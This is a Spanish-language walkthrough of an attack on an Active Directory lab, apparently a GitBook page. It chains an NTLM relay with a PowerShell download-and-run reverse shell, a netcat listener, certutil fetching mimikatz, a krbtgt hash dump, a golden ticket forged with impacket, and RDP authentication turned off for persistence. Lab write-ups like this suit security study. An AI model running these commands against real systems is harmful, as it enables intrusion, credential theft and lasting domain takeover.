<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FKB6AIcp6hanNk5h41UUI%2Fimage.avif?alt=media&amp;token=27614b52-39b3-4da7-86a1-5f7c2bacdd29" alt=""><figcaption></figcaption></figure>

Desde la Aragog, modificamos el script y le añadimos la ultima linea para que funcione

```
Invoke-PowerShellTcp -Reverse -IPAddress <aragog-ip> -Port 2121

```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FWnG3e8aYtloKdDVgAJyL%2Fimage.avif?alt=media&amp;token=cba854f6-09e0-4637-920e-bcdbbff58eb5" alt=""><figcaption></figcaption></figure>

Con Python expondremos un servicio web en el puerto 8000, ya que lo necesitamos para hacer una petición GET desde la victima y acceder al script.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FWM5FzpDa6ZH8yZMJXaPV%2Fimage.avif?alt=media&amp;token=17d804aa-ef7a-46b7-bfa1-1142818c5c6d" alt=""><figcaption></figcaption></figure>

Poenmos lo mismo que antes, pero al final le añadimos los siguientes parametros

```
python3 examples/ntlmrelayx.py -tf ../relay.list -smbsupport -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.2.42:8000/PS.ps1')"
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F2oiUmMVmLZrEJBhRJN3o%2Fimage.png?alt=media&amp;token=05f61db5-293d-4395-ae78-e335586b70a5" alt=""><figcaption></figcaption></figure>

nos ponemos en escucha con netcat por el puerto 2121

```
nc -nlvp 2121
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FAJuUmuFcVV8CKjRTYcMQ%2Fimage.png?alt=media&amp;token=ec85c160-902d-405d-9f7f-462b39b6baf3" alt=""><figcaption></figcaption></figure>

Una vez pasa vemos que el ntlm relay ejecuta el comando

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FK7ta8CeuoYYvHCWXmOGy%2Fimage.png?alt=media&amp;token=b544a08e-cc51-407f-825b-729f056c9e9b" alt=""><figcaption></figcaption></figure>

vemos la petición get en nuestro servicio web con python

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fd3kaUvrzQMGTR0uH3aOt%2Fimage.png?alt=media&amp;token=8d7d5d8b-6c91-457b-9fd8-31eade1ec5e7" alt=""><figcaption></figcaption></figure>

Revisamos netcat

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F3zbor4NJW2QUF25FAuDk%2Fimage.png?alt=media&amp;token=d0e5eaad-c5ee-49ff-ad26-d5efb1f468b5" alt=""><figcaption></figcaption></figure>

Y ya tenemos una consola remota, en este caso vamos a deshabilitar la Autenticación por red para el RDP.

```
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

Si ahora intentamos conectarnos por rdp en el pc 192.168.2.40 nos deja

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FTwN3anMxkotvms5y1m6S%2Fimage.png?alt=media&amp;token=cf4db651-1a9b-4886-92a4-b7212bb8fc85" alt=""><figcaption></figcaption></figure>

Si nos logueamos estamos dentro.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FIytNTkKPYlemKtJOMiSM%2Fimage.png?alt=media&amp;token=3f960068-5139-4d17-8e28-8232d3c66a1f" alt=""><figcaption></figcaption></figure>

Ahora vamos a por un Golden Ticket Attack (Persistencia).

Para ello recibimos una shell de el dc mediante psexec, una vez dentro, creamos una carpeta llamada test dentro de “C:\Windows\Temp”

```
cd ../Temp
mkdir test
cd test
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fe6GUHgb0NrPGYda2o1dX%2Fimage.png?alt=media&amp;token=7862a44f-8d46-40fd-8120-4e423c582043" alt=""><figcaption></figcaption></figure>

Una vez dentro, mediante la utilizad “certutil.exe” (se utiliza para descargar un archivo desde una URL especificada y almacenarlo en la caché de certificados de Windows) descargamos el mimikatz mediante un servicio web expuesto en el puerto 2121 por la aragog.

```
certutil.exe -f -urlcache -split http://192.168.2.43:2121/mimikatz.exe mimikatz.exe
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FWpZsV7HhRmb1GT9n5cco%2Fimage.png?alt=media&amp;token=104302bf-f678-4d1f-946b-ea6a9d62dd4e" alt=""><figcaption></figcaption></figure>

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F7WvBdKHA4kg1HQBN3vXK%2Fimage.png?alt=media&amp;token=b6360c97-3b37-439f-a511-6bc017904d98" alt=""><figcaption></figcaption></figure>

Una vez lo ejecutamos, le ponemos el siguiente comando:

```
lsadump::lsa /inject /name:krbtgt
```

Este extrae información sobre la cuenta de servicio "krbtgt" del sistema de autenticación de Windows, como el hash NTLM de este mismo, el SID del dominio y más.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fs2B7r8itYiF2zIBlNIBQ%2Fimage.png?alt=media&amp;token=e9a04d85-6113-4f3c-8d67-862f253b6533" alt=""><figcaption></figcaption></figure>

Una vez obtenida esta información la vamos a usar para generar un archivo llamado Golden.kirbi, este es un archivo de tickets Kerberos dorado, lo pasamos por smb a la Aragog

```
copy golden.kirbi \\192.168.2.43\smbFolder\golden.kirbi
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FNQReT2YSmwmrAkC5YIcH%2Fimage.png?alt=media&amp;token=0dd82d41-e122-4c4f-8c1d-970d3e6d2d13" alt=""><figcaption></figcaption></figure>

Otra manera de hacerlo es con la herramienta ticketer de impacket con el hash de krbtgt el ssid del dominio, el dominio y el nombre de usuario de la cuenta de usuario para la cual se generará el ticket Kerberos dorado.

```
python3 ticketer.py -nthash ebf897bee964487230d14f19550e8d3e -domain-sid S-1-5-21-836259429-1711750989-1830892918 -domain visma.local Administrator
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FmpMoSxEJwNP1eTjB1NTN%2Fimage.png?alt=media&amp;token=9c3d3652-cf48-4cc7-bbac-a5619cba8d4c" alt=""><figcaption></figcaption></figure>

Nos generará un archivo “Administrator.ccache” este lo usaremos para hacer pass the hash con psexec. Creamos una nueva variable de entorno llamada “KRBCCNAME” donde esta valdrá la ruta del archivo. Nos aseguramos de tener al DC en el \`/etc/hosts\` porque sinó no funcioa y al ejecutar el \`psexec\`, nos conectamos sin contraseña.

El hecho de tener el archivo “Administrator.ccache” nos permite hacer pass the ticket incluso si la contraseña del usuario Administrator cambia. Por lo que tenemos permanencia.

```
export KRB5CCNAME="./Administrator.ccache"
cat /etc/hosts # Nos aseguramos que el DC esta con su IP
examples/psexec.py -k -n (dominio)/Administrator@DCCompany cmd.exe
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FAVq9rcn4LA5p2nWGdIAF%2Fimage.png?alt=media&amp;token=c3a38a88-16c7-43ec-a950-f4bab59d72cb" alt=""><figcaption></figcaption></figure>

Una vez dentro, hacemos como antes y mediante la powershell activamos el escritorio remoto sin autenticación a nivel de red y ya podemos conectarnos con `rdesktop`.

```
rdesktop 192.168.2.253
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FdrkGHlykqKbGEE0hYPSl%2Fimage.png?alt=media&amp;token=3587e4d5-9584-43fd-912e-7c02e3eff2ee" alt=""><figcaption></figcaption></figure>

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F0DXARTmhkWZEX4wmWvNS%2Fimage.png?alt=media&amp;token=c75f27e6-bcfa-46ff-8ebe-588086debf33" alt=""><figcaption></figcaption></figure>

Y ya, finalmente ya hemos acabado hackeando el entorno entero y creando permanencia tanto en la Aragog como en el DC, lo que quiere decir que si cambian la contraseña de Administrator seguiré pudiendo conectarme.


